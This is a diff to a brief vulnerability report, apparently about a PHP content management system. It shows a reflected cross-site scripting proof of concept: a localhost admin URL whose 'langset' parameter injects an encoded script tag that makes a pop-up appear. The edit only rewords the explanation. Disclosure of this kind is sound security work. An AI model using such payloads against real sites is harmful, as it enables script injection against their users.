@@ -1,5 +1,5 @@
 ## XSS1 
-Visit `http://127.0.0.1//m/admin/index.php?a=dogetpassword&anyid=&c=index&lang=cn&langset=1%27%3E%3Cscript%3Ealert(1)%3C/script%3E&n=getpassword`, then it will pop a window
+Visit `http://127.0.0.1//m/admin/index.php?a=dogetpassword&anyid=&c=index&lang=cn&langset=1%27%3E%3Cscript%3Ealert(1)%3C/script%3E&n=getpassword`, the parameter langset is unsatified which result a pop up.
 ![](img/m1.jpg)
 ![](img/m2.jpg)  
 
